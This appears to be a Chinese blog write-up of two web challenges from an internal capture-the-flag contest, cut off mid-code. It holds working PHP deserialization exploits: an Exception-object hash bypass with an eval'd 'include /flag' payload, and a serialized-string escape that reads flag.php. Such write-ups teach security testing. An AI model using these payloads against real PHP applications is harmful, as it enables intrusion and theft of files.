<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>内部竞赛3 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>内部竞赛3</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-19T02:17:34.582Z" id="date"> 2023-08-19</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-19T12:33:04.614Z" id="updated"> 2023-08-19</time></div></span><br><span>Word Count: <div class="control">5.2k</div></span><br><span>Read Time: <div class="control">24 min</div></span></div></div><hr><div id="post-content"><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//只有36d的人才能看到flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))==<span class="hljs-number">0x36d</span>)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker!!!&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> hacker!!!<br></code></pre></td></tr></table></figure>
<p>反序列化前有个简单的特性，我们输入778反转后是877也就是0x36d的十进制，由于弱比较的类型转化，就能绕过。</p>
<p>接着看魔术方法，这里要求其变量不能相等，但经过md5加密与sha1加密之后要分别相等，相信大多数人觉得数组绕过就行了，但当你走到eval发现没办法了，这时候就涨知识了，用到了php的原生类：Exception类</p>
<p>在此类中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- `Exception::__construct` — 异常构造函数<br>- `Exception::getMessage` — 获取异常消息内容<br>- `Exception::getPrevious` — 返回异常链中的前一个异常<br>- `Exception::getCode` — 获取异常代码<br>- `Exception::getFile` — 创建异常时的程序文件名称<br>- `Exception::getLine` — 获取创建的异常所在文件中的行号<br>- `Exception::getTrace` — 获取异常追踪信息<br>- `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息<br>- `Exception::__toString` — 将异常对象转换为字符串<br>- `Exception::__clone` — 异常克隆<br></code></pre></td></tr></table></figure>
<p>可以看到自带tostring方法，这个方法用于将异常或错误对象转换为字符串。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//输出</span><br>exception <span class="hljs-string">&#x27;Exception&#x27;</span> with message <span class="hljs-string">&#x27;payload&#x27;</span> in D:\labwork\phpstudy_pro\WWW\test\test.php:<span class="hljs-number">2</span> Stack trace: <span class="hljs-comment">#0 &#123;main&#125;</span><br>exception <span class="hljs-string">&#x27;Exception&#x27;</span> with message <span class="hljs-string">&#x27;payload&#x27;</span> in D:\labwork\phpstudy_pro\WWW\test\test.php:<span class="hljs-number">2</span> Stack trace: <span class="hljs-comment">#0 &#123;main&#125;</span><br></code></pre></td></tr></table></figure>
<p>当然Eorror类与其一样，不过前者只用于php7，后者5和7均可，我们可以知道这道题版本为7，因此只能用该类</p>
<p>此时在注意preg_match函数多了一个math参数，这里将会把匹配到的内容分为数组穿进去，不过这里利用的点不是他</p>
<p>​		由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过</p>
<h3 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">适用PHP版本：无限制<br>当PHP&gt;=<span class="hljs-number">7</span>时，可以直接利用取反构造payload<br><br>PS C:\Users\Administrator&gt; php -r <span class="hljs-string">&quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;</span><br>Command line code:<span class="hljs-number">1</span>:<br><span class="hljs-keyword">string</span>(<span class="hljs-number">21</span>) <span class="hljs-string">&quot;%8F%97%8F%96%91%99%90&quot;</span><br><br><span class="hljs-comment">//实际上</span><br>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br><span class="hljs-comment">#phpinfo();</span><br></code></pre></td></tr></table></figure>
<p>则poc如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//利用链如下</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;   <span class="hljs-comment">//~urldecode=/flag</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//这里解释以下，为什么要闭合掉&quot;?&gt;&quot;，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819150211814.png'><img src="image-20230819150211814.png" alt="image-20230819150211814"></p>
<p>拿到flag</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2>
<p>点进去看到源码，我一看审计有难度。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];    <span class="hljs-comment">//get传参</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;  <span class="hljs-comment">//对变量进行检验,过滤特定关键词</span><br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);  <br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;  <span class="hljs-comment">//若session不存在,则销毁session</span><br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);   <span class="hljs-comment">//变量覆盖,漏洞利用点</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<span class="hljs-comment">//这里又sha1加密,大概率不用了考虑了,这里利用不了</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<span class="hljs-comment">//对序列化的session变量过滤在赋值</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123; <span class="hljs-comment">//这里没啥用</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<span class="hljs-comment">//反序列化切入点</span><br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br>&#125;  <br></code></pre></td></tr></table></figure>
<p>首先就是给f传参show_image以便进行反序列化,接着我们一步步测试一下</p>
<h3 id="方法一：反序列化字符串逃逸"><a href="#方法一：反序列化字符串逃逸" class="headerlink" title="方法一：反序列化字符串逃逸"></a>方法一：反序列化字符串逃逸</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;  <span class="hljs-comment">//对变量进行检验,过滤特定关键词</span><br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);  <br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-string">&#x27;Wm14aFp5NXdhSEE9&#x27;</span>;<span class="hljs-comment">//flag.php base64编码两次</span><br><br><span class="hljs-comment">//extract($_POST);   //变量覆盖,漏洞利用点</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819102914770.png'><img src="image-20230819102914770.png" alt="image-20230819102914770"></p>
<p>结合filter函数的过滤，这里可以想到反序列化字符串逃逸，又因为代码中说，如果get参数img_path不存在，则会直接给img变量赋值，那我们想绕过只能靠逃逸。可以先构造如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;  <span class="hljs-comment">//对变量进行检验,过滤特定关键词</span><br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);  <br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-string">&#x27;Wm14aFp5NXdhSEE9&#x27;</span>;<span class="hljs-comment">//flag.php base64编码两次</span><br><br><span class="hljs-comment">//extract($_POST);   //变量覆盖,漏洞利用点</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819103647148.png'><img src="image-20230819103647148.png" alt="image-20230819103647148"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">string</span>(<span class="hljs-number">124</span>) <span class="hljs-string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="hljs-string">&quot;;s:5:&quot;</span>guest<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-keyword">function</span><span class="hljs-string">&quot;;s:38:&quot;</span>a<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:16:&quot;</span><span class="hljs-title class_">Wm14</span>aFp5NXdhSEE9<span class="hljs-string">&quot;;&#125;&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&quot; </span><br><span class="hljs-string"></span><br><span class="hljs-string">//在这里我们就要利用function变量来构建img变量，于是我们要在user中添加flag或者其他关键词，以便其后被过滤为空的时候，可以吞进一部分function的内容。</span><br><span class="hljs-string">//再想一下，要吞到哪里，那很明显是&quot;</span>#<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-keyword">function</span><span class="hljs-string">&quot;;s:38:&quot;</span>a#<span class="hljs-string">&quot;，即#之间的内容，这样后面的img才会被当做新的session变量，那么我们看一下这一段字符串的数量：24，那我们可以给user赋值为6个flag即可，</span><br><span class="hljs-string"></span><br><span class="hljs-string">poc：</span><br><span class="hljs-string">$_SESSION[&quot;</span>user<span class="hljs-string">&quot;] = &#x27;flagflagflagflagflagflag&#x27;;</span><br><span class="hljs-string">$_SESSION[&#x27;function&#x27;] = &#x27;a&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$_SESSION[&#x27;</span>img<span class="hljs-string">&#x27;] = &#x27;</span><span class="hljs-title class_">Wm14</span>aFp5NXdhSEE9<span class="hljs-string">&#x27;;//flag.php base64编码两次</span><br></code></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">string</span>(<span class="hljs-number">144</span>) <span class="hljs-string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="hljs-string">&quot;;s:24:&quot;</span>flagflagflagflagflagflag<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-keyword">function</span><span class="hljs-string">&quot;;s:38:&quot;</span>a<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:16:&quot;</span><span class="hljs-title class_">Wm14</span>aFp5NXdhSEE9<span class="hljs-string">&quot;;&#125;&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Wm14aFp5NXdhSEE9&quot;</span>;&#125;<span class="hljs-string">&quot; </span><br><span class="hljs-string"></span><br><span class="hljs-string">//过滤后</span><br><span class="hljs-string">string(120) &quot;</span><span class="hljs-attr">a</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;<span 